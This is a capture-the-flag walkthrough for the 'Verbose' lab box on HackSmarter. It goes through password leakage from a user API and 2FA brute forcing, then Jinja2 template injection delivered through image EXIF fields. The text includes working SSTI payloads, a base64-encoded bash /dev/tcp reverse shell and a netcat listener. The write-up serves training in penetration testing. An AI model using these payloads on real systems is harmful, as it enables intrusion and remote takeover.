---
title: "Verbose"
date: 2026-01-25
layout: "writeup"
difficulty: "Easy"
excerpt: "Walkthrough for Verbose on HackSmarter"
os: "Linux"
platform: "HackSmarter"
tags: [HackSmarter, SSTI]
comments: false
---

Verbose is an easy rated box from [Hacksmarter](https://www.hacksmarter.org). First, let's use nmap to enumerate services running on this system with:

`nmap -p- -sV -sC -T4 -oN full_scan.txt 10.1.120.45`

Note: Your IP is likely different as it's unique each time the vulnerable system is started.

![](/images/Verbose1.png)

Based on the results, it appears that SSH and Werkzeug (a web server gateway interface) are the running services. Let's visit the website on port 80 first.

![](/images/Verbose2.png)

It appears that this is a portal and it appears that user registration is open. Before going any further, I started Burp Suite to intercept the traffic to see if there was anything interesting to find. Since we know this is a web application challenge based on the description, I attempted to register a new user account.

![Verbose4.png](/images/Verbose4.png)

Success! Let's login with this new user account and see what else we can find.

![Verbose5.png](/images/Verbose5.png)

It appears that we have two different actions (besides log out) to test. Let's click on the Check Inbox button first. We will notice something that seems interesting. It appears that it's calling a user API for all users, and it apperas that there's a parameter with u=4. This might indicate that we're the 4th user on the platform. Let's keep that in the back of our mind for now.

![Verbose6.png](/images/Verbose6.png)

Once the page loads, it does something wonderful for us. It displays a list of all users on the system, which are tony, johnny, admin, and student. 

![Verbose7.png](/images/Verbose7.png)

Nothing of interest happened when I sent the email, so I went back to looking at the API call. The response piqued my interest, as it had passwords for all users in the response:

![Verbose8.png](/images/Verbose8.png)

Logging in with the admin user presents a 2FA screen:

![Verbose9.png](/images/Verbose9.png)

I attempted to brute force this 2FA prompt with a Sniper Attack in Burp Suite, but initially received server errors. I added a 500 millisecond second delay between requests and limited concurrent requests to 5. After a few minutes, one of the codes will lead to a redirect! 

![Verbose10.png](/images/Verbose10.png)

Once logged in, navigating to the admin panel gets you the first flag:

![Verbose11.png](/images/Verbose11.png)

Next, it appears that we can upload an image for Site Branding. Let's upload a PNG logo as recommended.

![Verbose12.png](/images/Verbose12.png)

After uploading and viewing the image, it appears that it's pulling in some of the metadata from the image, in this case, it appears that it is the artist. I attempted a few different payloads, but uncovered that it is vulnerable to SSTI:

`exiftool -author="{{7*7}}" cat.png`

![Verbose13.png](/images/Verbose13.png)

Since the website responded with 49 (which is what 7*7 equals withour test SSTI payload), we can confirm this site is vulnerable to SSTI. Let's now use this to attempt to get a reverse shell. First, we need to find the index for the Popen subclass, which can be done with the following

`exiftool -author="{% for c in self.__class__.mro()[1].__subclasses__() %}{% if \"Popen\" in c.__name__ %}{{ loop.index0 }}{% endif %}{% endfor %}" cat.png`

This will return the following:

![Verbose14.png](/images/Verbose14.png)

Now that we know it's the 569th index, let's create a base64 encoded reverse shell with:

`echo "bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1" | base64`

Next, let's place that into the Author field with the following:

`exiftool -Author='{{ self.__class__.mro()[1].__subclasses__()[569]("echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yMDAuMzIuNi80NTY3IDA+JjEK | base64 -d | bash",shell=True,stdout=-1).communicate() }}' cat.png`

Before uploading this image, we need to create a netcat listener with:

`nc -nvlp 4567`

Now, upload the image and preview it, you should get a reverse shell on your netcat listener:

![Verbose15.png](/images/Verbose15.png)

Great! It looks like we have a reverse shell, and it appears that this service was running as the root user! Navigate to the root user home directory and view the contents of root.txt for the final flag.

![Verbose16.png](/images/Verbose16.png)

After reviewing the notes for this system, the author noted that there were 3 ways to gain admin. I assumed that the other two were SSTI, so I entered the `{{7*7}}` payload into the Update Email and Phone Number fields on the /profile endpoint. This returned 49 for both values, so SSTI could have been performed here as well without the need for uploading an image.

![Verbose17.png](/images/Verbose17.png)
